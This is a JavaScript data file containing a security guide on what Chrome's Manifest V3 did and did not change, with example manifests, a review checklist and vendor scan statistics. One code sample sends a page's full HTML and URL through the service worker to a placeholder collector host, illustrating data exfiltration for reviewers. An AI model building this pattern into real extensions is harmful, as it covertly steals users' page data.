/**
 * Manifest V3 Extension Security: What Changed and What Still Matters
 *
 * Structured blocks — see components/article/ArticleBlocks.jsx for the
 * supported block types, and data/articles/index.js for the post shape.
 *
 * Every claim in `sources` was link-checked (HTTP 200) on 2026-07-28.
 * Corpus figures come from ExtensionShield's own scan database and are
 * always presented with n and the convenience-sample caveat.
 */

export default {
  "slug": "manifest-v3-extension-security",
  "collection": "guide",
  "title": "Manifest V3 Extension Security: What Changed and What Still Matters",
  "description": "A technical account of what Manifest V3 changed in Chrome extension security, what it left untouched, and how to review an MV3 manifest properly.",
  "category": "Technical",
  "datePublished": "2026-04-01",
  "dateModified": "2026-07-28",
  "readingTime": 9,
  "author": {
    "name": "Stanzin Norzang",
    "jobTitle": "Founder & Engineer",
    "url": "https://extensionshield.com/about",
    "sameAs": [
      "https://github.com/Stanzin7",
      "https://www.linkedin.com/in/stanzin-norzang7/"
    ]
  },
  "keyFindings": [
    "MV3 changed the architecture — service workers, declarativeNetRequest, and a ban on remotely hosted code.",
    "It did not stop content scripts reading and modifying page DOM, nor arbitrary fetch() to any endpoint.",
    "Broad host permissions carry the same reach under MV3 as they did under MV2.",
    "Treat MV3 as a narrowing of some attack surface, not as a security guarantee."
  ],
  "sections": [
    {
      "heading": "What Manifest V3 changed, and when it stopped being optional",
      "id": "what-mv3-changed",
      "blocks": [
        {
          "type": "p",
          "text": "Manifest V3 is no longer a migration question for most teams; it is the only shape a Chrome extension can take. Google's published deprecation timeline records that the Chrome Web Store stopped accepting new Manifest V2 extensions with visibility set to Public or Unlisted in January 2022, and Private ones in June 2022. Warning banners reached pre-stable channels on June 3rd 2024, and Chrome began disabling MV2 extensions on the stable channel on October 9th 2024. By March 31st 2025, in Google's words, \"all users on all channels of Chrome now have Manifest V2 extensions disabled by default, but users continue to be able to turn their Manifest V2 extensions back on.\" That re-enable path closed on July 24th 2025: \"With Chrome 138 all users on all channels of Chrome have now Manifest V2 extensions disabled. Users can no longer turn them back on.\" The timeline lists August 31st 2026 as the date all remaining Manifest V2 extensions are removed from the Chrome Web Store."
        },
        {
          "type": "p",
          "text": "The platform changes themselves are well documented and worth stating precisely, because most of the argument about MV3's security value comes from imprecision about what each change actually does."
        },
        {
          "type": "list",
          "ordered": false,
          "items": [
            "Background pages became service workers. Chrome's migration guide describes MV2 extensions as having \"a long-lived background page that took up resources, even when an extension wasn't running,\" replaced in MV3 by service workers \"which run only when needed.\"",
            "Blocking webRequest was replaced by declarativeNetRequest for most extensions. The webRequest reference states that \"as of Manifest V3, the \"webRequestBlocking\" permission is no longer available for most extensions,\" while \"policy installed extensions can continue to use \"webRequestBlocking\".\"",
            "Remotely hosted code was prohibited. MV3 \"removes the ability for an extension to use remotely hosted code, which presents security risks by allowing unreviewed code to be executed in extensions.\"",
            "Content Security Policy for extension pages was tightened. The script-src, object-src and worker-src directives may only use 'self', 'none', 'wasm-unsafe-eval', or — for unpacked extensions only — any localhost source. Chrome's guidance is blunt: \"You can no longer execute external logic using executeScript(), eval(), and new Function().\"",
            "Host access moved into its own manifest field. Chrome's Declare permissions guide documents host_permissions as separate from permissions, alongside optional_permissions and optional_host_permissions, which are \"granted by the user at runtime, instead of at install time.\""
          ]
        },
        {
          "type": "callout",
          "variant": "note",
          "title": "Scope of this post",
          "text": "Every API behavior below was checked against developer.chrome.com. Where the documentation does not state something, this post says so rather than filling the gap."
        }
      ]
    },
    {
      "heading": "Service workers and the remote-code boundary",
      "id": "service-workers-and-remote-code",
      "blocks": [
        {
          "type": "p",
          "text": "The service worker change is primarily a resource-lifecycle change. An ephemeral background context does not reduce what an extension is permitted to do; it changes when the code is resident. Any event the extension registers for — alarms, runtime messages, navigation events, network events it is permitted to observe — wakes the worker. For a reviewer, the practical consequence is that \"the background script is not always running\" is not a mitigating control. It is a scheduling detail."
        },
        {
          "type": "p",
          "text": "The remotely hosted code prohibition is the more consequential change, and it is also the one most often overstated. Chrome defines RHC as \"anything that is executed by the browser that is loaded from someplace other than the extension's own files. Things like JavaScript and WASM.\" The same page continues: \"It does not include data or things like JSON or CSS.\""
        },
        {
          "type": "callout",
          "variant": "key",
          "title": "Remote configuration is explicitly not remotely hosted code",
          "text": "The Chrome Web Store's Additional Requirements for Manifest V3 lists as permitted: \"Fetching a remote configuration file for A/B testing or determining enabled features, where all logic for the functionality is contained within the extension package.\" Shipping new logic requires review. Changing which of the already-reviewed behaviors is active does not."
        },
        {
          "type": "p",
          "text": "The same policy page draws the line on the other side, listing as violations \"using JavaScript's eval() method or other mechanisms to execute a string fetched from a remote source\" and \"building an interpreter to run complex commands fetched from a remote source, even if those commands are fetched as data.\" The boundary is logic, not transport."
        },
        {
          "type": "p",
          "text": "Three documented paths remain for executing or injecting code beyond ordinary package review. Sandboxed iframes: Chrome's security migration guide states that \"eval and new Function(...) are still supported in sandboxed iframes,\" and the sandboxing guide notes that \"whenever a sandboxed page is loaded, it will be moved to a unique origin, and will be denied access to chrome.* APIs.\" The chrome.debugger API, which \"serves as an alternate transport for Chrome's remote debugging protocol\" and lets an extension \"instrument network interaction, debug JavaScript, mutate the DOM and CSS, and more\" — Chrome displays a browser-level notification bar while a debugger session is attached, whose Cancel button detaches it, though neither the chrome.debugger reference nor Chrome's debugging tutorial documents this, so treat it as observed behaviour rather than a documented guarantee. And the userScripts API, which the reference describes as letting an extension \"run arbitrary code.\" That one is gated behind a user opt-in: Developer mode before Chrome 138, and a per-extension Allow User Scripts toggle from Chrome 138 onward, where \"if the Allow User Scripts toggle is not enabled, chrome.userScripts is undefined.\""
        }
      ]
    },
    {
      "heading": "declarativeNetRequest versus blocking webRequest",
      "id": "declarativenetrequest",
      "blocks": [
        {
          "type": "p",
          "text": "This is the change that generated the most public argument and the one where the security claim is genuinely defensible — but narrower than usually described. declarativeNetRequest lets an extension block or modify requests without the extension reading the request contents. The rules are static or dynamic data structures the browser evaluates; the extension is not handed each request for inspection. That is a real reduction in what a compromised or malicious ad blocker can passively harvest."
        },
        {
          "type": "p",
          "text": "The limits are published and are not small: a guaranteed minimum of 30,000 static rules across enabled rulesets, up to 100 rulesets with 50 enabled simultaneously, 30,000 dynamic \"safe\" rules, 5,000 dynamic \"unsafe\" rules, 5,000 session rules, and 1,000 regular-expression rules per type."
        },
        {
          "type": "callout",
          "variant": "warning",
          "title": "Observational webRequest is unchanged",
          "text": "The webRequest reference states: \"Aside from \"webRequestBlocking\", the webRequest API is unchanged and available for normal use.\" An MV3 extension with the webRequest permission and broad host permissions can still observe request activity across those hosts. Only the blocking capability was withdrawn, and only for extensions that are not policy installed."
        },
        {
          "type": "p",
          "text": "Permission surfaces differ too. The declarativeNetRequest permission \"triggers a permission warning at install time but provides implicit access to allow, allowAllRequests and block rules.\" declarativeNetRequestWithHostAccess \"is not shown at install time, but you must request host permissions before you can perform any action on a host.\" A quiet install prompt is not the same as reduced access."
        }
      ]
    },
    {
      "heading": "The permission model, in two manifests",
      "id": "permission-model",
      "blocks": [
        {
          "type": "p",
          "text": "MV3 gave reviewers a cleaner object to reason about: host access is a distinct manifest field, and both API permissions and host permissions have optional variants that can be requested at runtime. Chrome requires that \"permissions must be requested from inside a user gesture, like a button's click handler.\" Nothing in the platform compels a developer to use any of this. The two manifests below are both valid MV3."
        },
        {
          "type": "code",
          "language": "json",
          "caption": "Narrow permission model — scoped host access, isolated content script, explicit CSP",
          "code": "{\n  \"manifest_version\": 3,\n  \"name\": \"Invoice Formatter\",\n  \"version\": \"2.1.0\",\n  \"permissions\": [\"activeTab\", \"storage\"],\n  \"optional_host_permissions\": [\"https://*/*\"],\n  \"background\": {\n    \"service_worker\": \"sw.js\",\n    \"type\": \"module\"\n  },\n  \"content_scripts\": [\n    {\n      \"matches\": [\"https://app.example.com/invoices/*\"],\n      \"js\": [\"content.js\"],\n      \"run_at\": \"document_idle\",\n      \"all_frames\": false,\n      \"world\": \"ISOLATED\"\n    }\n  ],\n  \"content_security_policy\": {\n    \"extension_pages\": \"script-src 'self'; object-src 'self'\"\n  }\n}"
        },
        {
          "type": "code",
          "language": "json",
          "caption": "Broad permission model — same stated feature, effectively unlimited reach",
          "code": "{\n  \"manifest_version\": 3,\n  \"name\": \"Invoice Formatter\",\n  \"version\": \"2.1.0\",\n  \"permissions\": [\n    \"tabs\",\n    \"storage\",\n    \"scripting\",\n    \"cookies\",\n    \"webRequest\",\n    \"webNavigation\",\n    \"management\",\n    \"downloads\"\n  ],\n  \"host_permissions\": [\"<all_urls>\"],\n  \"background\": {\n    \"service_worker\": \"sw.js\"\n  },\n  \"content_scripts\": [\n    {\n      \"matches\": [\"*://*/*\"],\n      \"js\": [\"inject.js\"],\n      \"run_at\": \"document_start\",\n      \"all_frames\": true,\n      \"world\": \"MAIN\"\n    }\n  ]\n}"
        },
        {
          "type": "p",
          "text": "Chrome's match-pattern documentation defines <all_urls> as matching \"any URL that starts with a permitted scheme, including any pattern listed under valid patterns.\" The second manifest also declares \"world\": \"MAIN\", which the content_scripts reference describes this way: \"Choosing the \"MAIN\" world means the script will share the execution environment with the host page's JavaScript.\" It carries an explicit warning: \"There are risks involved when using the \"MAIN\" world. The host page can access and interfere with the injected script.\" Note the direction Chrome emphasises — the page can reach the extension's injected code. The reverse exposure, extension code reaching page internals, follows from the same shared environment. The difference between these two files is not a Manifest V3 difference. It is a developer decision that MV3 left entirely intact."
        },
        {
          "type": "callout",
          "variant": "note",
          "title": "A subtlety in the runtime model",
          "text": "Chrome's permissions documentation notes that after a permission has been removed, \"calling permissions.request() usually adds the permission back without prompting the user.\" Runtime grants are not reliably revocable from the user's side once given."
        }
      ]
    },
    {
      "heading": "Mapping MV3 changes to risk actually moved",
      "id": "risk-mapping",
      "blocks": [
        {
          "type": "table",
          "caption": "Each row states the specific risk reduced and the specific risk left in place.",
          "columns": [
            "MV3 change",
            "Risk actually reduced",
            "Risk unchanged"
          ],
          "rows": [
            [
              "Background page to service worker",
              "Persistent resident background context and its resource cost",
              "Every capability the extension holds; the worker wakes on any registered event"
            ],
            [
              "Blocking webRequest to declarativeNetRequest",
              "Extension reading full request contents in order to block them",
              "Observational webRequest, which the docs state is unchanged and available"
            ],
            [
              "Remotely hosted code prohibited",
              "Shipping new JavaScript or WASM outside Chrome Web Store review",
              "Remote JSON configuration, explicitly permitted for determining enabled features"
            ],
            [
              "Extension-page CSP restricted",
              "eval() and new Function() gadgets in extension pages",
              "eval in sandboxed iframes; userScripts API behind a user toggle; chrome.debugger"
            ],
            [
              "executeScript takes func or files, not code strings",
              "Injecting attacker-supplied strings through executeScript",
              "Injecting extension-shipped code into the page, including into the MAIN world"
            ],
            [
              "host_permissions split into its own field",
              "Ambiguity about what host access an extension declares",
              "Breadth itself: <all_urls> remains requestable and install-granted"
            ],
            [
              "optional_permissions and runtime grants",
              "Install-time footprint, when a developer chooses to use them",
              "Nothing requires their use; removed permissions can usually be re-requested silently"
            ],
            [
              "Permission warnings on update",
              "Adding a warning-triggering permission may disable the extension until accepted",
              "Chrome's guidance does not extend this to updates inside the granted set"
            ]
          ]
        }
      ]
    },
    {
      "heading": "What Manifest V3 did not fix",
      "id": "what-mv3-did-not-fix",
      "blocks": [
        {
          "type": "p",
          "text": "Content scripts still read and rewrite the DOM. Chrome's content-scripts guide says that using the standard Document Object Model, they \"are able to read details of the web pages the browser visits, make changes to them, and pass information to their parent extension.\" Isolated worlds keep an extension's JavaScript variables separate from the page's — an isolated world is \"a private execution environment that isn't accessible to the page or other extensions\" — but access to the page's DOM is shared. Session tokens rendered into a page, form values, and message contents are all reachable from an ISOLATED-world content script with a matching host pattern."
        },
        {
          "type": "p",
          "text": "MAIN-world execution goes further. Both the manifest content_scripts key and the scripting API expose an execution world that shares the execution environment with the host page's JavaScript; the scripting reference calls MAIN \"the main world of the DOM, which is the execution environment shared with the host page's JavaScript.\" That is the environment in which page functions can be wrapped and page objects reassigned. MV3 documented and formalized this capability; it did not restrict it."
        },
        {
          "type": "p",
          "text": "Exfiltration is still available. MV3 did tighten one path: the network-requests guide states that \"cross-origin requests are always treated as such in content scripts, even if the extension has host permissions.\" The service worker is not so bound — \"a script executing in an extension service worker or foreground tab can talk to remote servers outside of its origin, as long as the extension requests host permissions.\" The relevant point for reviewers is that CORS governs whether a response can be read, not whether a request is sent. Data can leave without the sender ever reading a reply."
        },
        {
          "type": "code",
          "language": "javascript",
          "caption": "The two-half pattern a manifest review alone will not show you",
          "code": "// content.js — ISOLATED world, no cross-origin fetch of its own\nchrome.runtime.sendMessage({\n  kind: \"page\",\n  url: location.href,\n  html: document.body.innerHTML\n});\n\n// sw.js — the service worker carries the extension's host permissions\nchrome.runtime.onMessage.addListener((msg) => {\n  fetch(\"https://collector.example.net/ingest\", {\n    method: \"POST\",\n    headers: { \"Content-Type\": \"text/plain\" },\n    body: JSON.stringify(msg)\n  });\n});"
        },
        {
          "type": "p",
          "text": "Storage remains a weak place to put secrets. The chrome.storage reference does not describe local or sync storage as encrypted; what it does say is \"if you're working with sensitive user data, instead use storage.session,\" which is in-memory and where \"the storage is cleared if the extension is disabled, reloaded, updated, and when the browser restarts.\" Session storage is not exposed to content scripts by default, \"but this behavior can be changed by calling chrome.storage.session.setAccessLevel().\" Treat anything in storage.local as readable by anything with local access to the profile."
        },
        {
          "type": "p",
          "text": "Auto-update still ships new code. Chrome's permission-warnings guidance states that when an extension adds a new permission that triggers a warning \"it may temporarily disable it. The extension will be re-enabled only after the user agrees to accept the new permission.\" That control is real, and it is scoped to warning-triggering permission changes."
        },
        {
          "type": "callout",
          "variant": "note",
          "title": "Where the documentation stops",
          "text": "Chrome's permission-warnings guide addresses updates that add warning-triggering permissions. It does not describe what happens on updates that stay inside the already-granted set. Reviewers should treat the absence of a documented prompt for such updates as an operational assumption to test in their own environment, not as a documented guarantee either way."
        },
        {
          "type": "p",
          "text": "That distinction matters for threat modelling. An extension that shipped with <all_urls> in version 1.0 already holds the reach it needs; a later version can change what it does with that reach without adding a single new permission string to the manifest."
        }
      ]
    },
    {
      "heading": "A documented case: the December 2024 extension supply-chain campaign",
      "id": "supply-chain-evidence",
      "blocks": [
        {
          "type": "p",
          "text": "Sekoia's published analysis of the December 2024 campaign against Chrome extension developers describes attackers obtaining publishing access through a malicious OAuth application — named Privacy Policy Extensions — granted permission to \"see, edit, update, or publish\" Chrome Web Store extensions, then pushing trojanised updates. Sekoia describes the injected content scripts matching http://*/* and https://*/* with \"run_at\": \"document_start\" so they execute before other scripts, background scripts fetching configuration from command-and-control servers, and collected credentials and session data exfiltrated to attacker infrastructure."
        },
        {
          "type": "p",
          "text": "Sekoia characterises the scale as approximately a dozen compromised Chrome extensions with potential impact on hundreds of thousands of end users, and lists sixteen identified compromised extensions with compromise dates ranging from 12 to 30 December 2024."
        },
        {
          "type": "p",
          "text": "Sekoia's writeup does not state which manifest version the affected extensions used, so this post does not claim it. What the case does demonstrate is a chain that MV3 does not interrupt at any point: publisher account compromise, an update that stays inside the already-granted permission set, broad content-script host patterns, remote configuration steering behavior after review, and exfiltration over ordinary network calls. None of the five MV3 structural changes has a control surface on that path."
        }
      ]
    },
    {
      "heading": "What our own corpus shows about permission breadth",
      "id": "corpus-signal",
      "blocks": [
        {
          "type": "p",
          "text": "ExtensionShield's scan corpus for this analysis is 57 completed extension scans; failed scans are excluded. It is a convenience sample of extensions submitted to the public scanner, not a random sample of the Chrome Web Store, and none of these figures should be extrapolated to the store as a whole. Within that sample, 56 of the 57 had both a Chrome Web Store star rating and an ExtensionShield security score; one listing had no published rating."
        },
        {
          "type": "stat",
          "items": [
            {
              "value": "0.11",
              "label": "Pearson r between Web Store star rating and security score (n=56 rated listings)"
            },
            {
              "value": "24.6%",
              "label": "of the 57-scan sample declares <all_urls> host access"
            },
            {
              "value": "15 of 29",
              "label": "extensions rated 4.5 stars or higher that scored below 80"
            },
            {
              "value": "34",
              "label": "broad-host pattern occurrences across the 57 scans"
            }
          ]
        },
        {
          "type": "p",
          "text": "Mean star rating across the rated listings is 4.31; mean security score 76.6, median 79, range 35–100. Risk levels break down as 28 low, 21 medium, 3 high, 5 none. Of the 29 extensions rated 4.5 stars or higher, 15 scored below 80, 9 below 70, and 4 below 60. The correlation figure is the one worth sitting with: within this sample of 57, user ratings carry essentially no information about permission breadth or security posture. Ratings measure whether the extension does what users wanted. They do not measure what else it can do. Again, this describes the sample only."
        },
        {
          "type": "table",
          "caption": "Permission prevalence across 57 scanned extensions. Convenience sample; not generalisable to the Chrome Web Store.",
          "columns": [
            "Permission",
            "Share of corpus"
          ],
          "rows": [
            [
              "storage",
              "86.0%"
            ],
            [
              "scripting",
              "49.1%"
            ],
            [
              "tabs",
              "40.4%"
            ],
            [
              "activeTab",
              "29.8%"
            ],
            [
              "alarms",
              "26.3%"
            ],
            [
              "unlimitedStorage",
              "24.6%"
            ],
            [
              "offscreen",
              "21.1%"
            ],
            [
              "webRequest",
              "21.1%"
            ],
            [
              "contextMenus",
              "19.3%"
            ],
            [
              "webNavigation",
              "19.3%"
            ],
            [
              "cookies",
              "19.3%"
            ],
            [
              "declarativeNetRequest",
              "17.5%"
            ],
            [
              "downloads",
              "12.3%"
            ],
            [
              "management",
              "10.5%"
            ],
            [
              "notifications",
              "10.5%"
            ]
          ]
        },
        {
          "type": "p",
          "text": "Two things stand out within this sample. First, declarativeNetRequest at 17.5% has not displaced webRequest at 21.1% — consistent with the documented fact that observational webRequest remains fully available in MV3. Second, host access is where the reach actually lives: <all_urls> at 24.6%, https://*/* at 14.0%, http://*/* at 12.3%, and *://*/* at 8.8%. Those four patterns account for the 34 broad-host occurrences noted above."
        }
      ]
    },
    {
      "heading": "Reviewing an MV3 extension",
      "id": "review-checklist",
      "blocks": [
        {
          "type": "steps",
          "items": [
            {
              "title": "Read host_permissions before permissions",
              "text": "API permissions describe capability; host patterns describe reach. An extension with two permissions and <all_urls> is broader than one with eight permissions scoped to a single domain."
            },
            {
              "title": "Check the execution world of every content script",
              "text": "\"world\": \"MAIN\" in the manifest, or world: 'MAIN' passed to scripting.executeScript or registerContentScripts, means extension code runs in the page's own JavaScript environment. Chrome's own reference flags this as carrying risk. Require a stated reason."
            },
            {
              "title": "Trace the content script to service worker to network path",
              "text": "Content scripts are always treated as cross-origin in MV3, so the interesting flow is message passing into the service worker. Enumerate every fetch destination in the worker and compare it to the declared host permissions and the stated purpose."
            },
            {
              "title": "Find the remote configuration",
              "text": "Remote JSON is not remotely hosted code and is explicitly permitted for determining enabled features. If the extension fetches config at startup, the reviewed package is not the whole behavior. Ask what the config can switch on."
            },
            {
              "title": "Look for the documented eval and injection paths",
              "text": "Sandboxed iframes, chrome.debugger, and the userScripts API are the supported ways to run code the package review did not cover. Their presence is not automatically a finding, but it changes what the package review proved."
            },
            {
              "title": "Assume update drift",
              "text": "A permission set granted at install persists across updates. Chrome documents re-consent only for newly added warning-triggering permissions. Version-pin where your management tooling allows, and re-review on version change rather than on permission change."
            }
          ]
        },
        {
          "type": "p",
          "text": "MV3 closed the unreviewed-JavaScript path and the request-inspection path, tightened extension-page CSP, and made host access legible as a separate manifest field. It did not change what a content script can do to a page, what a service worker can send to a network endpoint, how much a broad host pattern grants, or the fact that an approved extension carries its grant forward across updates. Reviewing extensions well under MV3 means reading the manifest for reach, then reading the code for where that reach goes."
        },
        {
          "type": "callout",
          "variant": "note",
          "title": "Where this fits in ExtensionShield",
          "text": "ExtensionShield scores extensions across Security, Privacy and Governance layers weighted near-equally, with hard gates that override the weighted score to BLOCK for severe findings such as malware indicators or credential capture. /scan takes a Chrome Web Store URL for a pre-install review; /scan/upload takes a private CRX or ZIP for a pre-release audit. The scoring methodology is published at /research/methodology and published case studies are at /research/case-studies. The core is open source."
        }
      ]
    }
  ],
  "sources": [
    {
      "title": "Manifest V3 — What is Manifest V3?",
      "publisher": "Chrome for Developers",
      "url": "https://developer.chrome.com/docs/extensions/develop/migrate/what-is-mv3"
    },
    {
      "title": "Manifest V2 support timeline",
      "publisher": "Chrome for Developers",
      "url": "https://developer.chrome.com/docs/extensions/develop/migrate/mv2-deprecation-timeline"
    },
    {
      "title": "Improve extension security",
      "publisher": "Chrome for Developers",
      "url": "https://developer.chrome.com/docs/extensions/develop/migrate/improve-security"
    },
    {
      "title": "Deal with remote hosted code violations",
      "publisher": "Chrome for Developers",
      "url": "https://developer.chrome.com/docs/extensions/develop/migrate/remote-hosted-code"
    },
    {
      "title": "Additional Requirements for Manifest V3 — Chrome Web Store Program Policies",
      "publisher": "Chrome for Developers",
      "url": "https://developer.chrome.com/docs/webstore/program-policies/mv3-requirements"
    },
    {
      "title": "Use eval() in sandboxed iframes",
      "publisher": "Chrome for Developers",
      "url": "https://developer.chrome.com/docs/extensions/how-to/security/sandboxing-eval"
    },
    {
      "title": "chrome.declarativeNetRequest API reference",
      "publisher": "Chrome for Developers",
      "url": "https://developer.chrome.com/docs/extensions/reference/api/declarativeNetRequest"
    },
    {
      "title": "chrome.webRequest API reference",
      "publisher": "Chrome for Developers",
      "url": "https://developer.chrome.com/docs/extensions/reference/api/webRequest"
    },
    {
      "title": "chrome.scripting API reference",
      "publisher": "Chrome for Developers",
      "url": "https://developer.chrome.com/docs/extensions/reference/api/scripting"
    },
    {
      "title": "chrome.userScripts API reference",
      "publisher": "Chrome for Developers",
      "url": "https://developer.chrome.com/docs/extensions/reference/api/userScripts"
    },
    {
      "title": "chrome.debugger API reference",
      "publisher": "Chrome for Developers",
      "url": "https://developer.chrome.com/docs/extensions/reference/api/debugger"
    },
    {
      "title": "chrome.permissions API reference",
      "publisher": "Chrome for Developers",
      "url": "https://developer.chrome.com/docs/extensions/reference/api/permissions"
    },
    {
      "title": "chrome.storage API reference",
      "publisher": "Chrome for Developers",
      "url": "https://developer.chrome.com/docs/extensions/reference/api/storage"
    },
    {
      "title": "Content scripts",
      "publisher": "Chrome for Developers",
      "url": "https://developer.chrome.com/docs/extensions/develop/concepts/content-scripts"
    },
    {
      "title": "content_scripts manifest key",
      "publisher": "Chrome for Developers",
      "url": "https://developer.chrome.com/docs/extensions/reference/manifest/content-scripts"
    },
    {
      "title": "Declare permissions",
      "publisher": "Chrome for Developers",
      "url": "https://developer.chrome.com/docs/extensions/develop/concepts/declare-permissions"
    },
    {
      "title": "Permission warnings",
      "publisher": "Chrome for Developers",
      "url": "https://developer.chrome.com/docs/extensions/develop/concepts/permission-warnings"
    },
    {
      "title": "Cross-origin network requests",
      "publisher": "Chrome for Developers",
      "url": "https://developer.chrome.com/docs/extensions/develop/concepts/network-requests"
    },
    {
      "title": "Match patterns",
      "publisher": "Chrome for Developers",
      "url": "https://developer.chrome.com/docs/extensions/develop/concepts/match-patterns"
    },
    {
      "title": "Targeted supply chain attack against Chrome browser extensions",
      "publisher": "Sekoia.io",
      "url": "https://www.sekoia.com/blog/targeted-supply-chain-attack-against-chrome-browser-extensions"
    }
  ],
  "faq": [
    {
      "q": "Did Manifest V3 make Chrome extensions more secure?",
      "a": "It moved specific risks. It closed the path where an extension executes JavaScript or WASM that Chrome Web Store review never saw, it removed blocking webRequest for most extensions so that request contents are no longer handed to the extension in order to block them, and it tightened the Content Security Policy for extension pages so eval() and new Function() are unavailable there. It did not change what a content script can do to page DOM, what a service worker can send to a network endpoint, or how much reach a broad host permission grants."
    },
    {
      "q": "Can an MV3 extension still change its behavior after review?",
      "a": "Yes, within limits. Chrome's remote-hosted-code definition excludes data such as JSON and CSS, and the Chrome Web Store's Manifest V3 requirements explicitly permit \"fetching a remote configuration file for A/B testing or determining enabled features, where all logic for the functionality is contained within the extension package.\" New logic requires a reviewed update; switching between already-shipped behaviors does not. The same policy lists building an interpreter for remotely fetched commands as a violation, even when those commands arrive as data. There are also three documented execution paths beyond ordinary package review: sandboxed iframes, where eval and new Function are still supported; the chrome.debugger API; and the userScripts API behind a user opt-in toggle."
    },
    {
      "q": "Does an extension update require the user to re-approve permissions?",
      "a": "Chrome documents re-consent for one case: when an update adds a permission that triggers a warning, the permission-warnings guide states it \"may temporarily disable\" the extension, and \"the extension will be re-enabled only after the user agrees to accept the new permission.\" That guide does not describe what happens on updates that stay inside the permission set already granted, so treat the absence of a prompt there as an operational assumption to test rather than a documented guarantee. Either way, an extension granted <all_urls> at install continues to hold that reach across subsequent versions."
    },
    {
      "q": "Is observational webRequest still available in Manifest V3?",
      "a": "Yes. The chrome.webRequest reference states that aside from the webRequestBlocking permission, the API is unchanged and available for normal use, and that policy-installed extensions can continue to use webRequestBlocking. An MV3 extension with the webRequest permission and matching host permissions can still observe request activity; only the ability to block or modify requests through that API was withdrawn, and only for extensions that are not policy installed."
    },
    {
      "q": "Do Chrome Web Store ratings tell you anything about extension security?",
      "a": "In the ExtensionShield scan sample used for this post — 57 completed scans — the Pearson correlation between Web Store star rating and ExtensionShield security score is r = 0.11, essentially no relationship. Of the 29 extensions in that sample rated 4.5 stars or higher, 15 scored below 80, 9 below 70, and 4 below 60. This is a convenience sample of extensions submitted to the public scanner rather than a random sample of the Chrome Web Store, so the figures describe those 57 scans and should not be extrapolated to the store as a whole."
    },
    {
      "q": "What is the single most useful thing to check in an MV3 manifest?",
      "a": "The host_permissions field and the matches patterns on content_scripts. API permissions describe capability; host patterns describe reach, and reach is what determines blast radius if the publisher account is compromised. After that, check the execution world of each content script — \"world\": \"MAIN\" means extension code shares the host page's JavaScript environment, which Chrome's manifest reference flags with an explicit warning that the host page can access and interfere with the injected script."
    }
  ],
  "internalLinks": [
    {
      "label": "Audit a CRX or ZIP before release",
      "to": "/guides/audit-crx-zip-before-release"
    },
    {
      "label": "Chrome extension permissions explained",
      "to": "/chrome-extension-permissions"
    },
    {
      "label": "Private CRX/ZIP audit",
      "to": "/scan/upload"
    },
    {
      "label": "Scoring methodology",
      "to": "/research/methodology"
    }
  ]
};
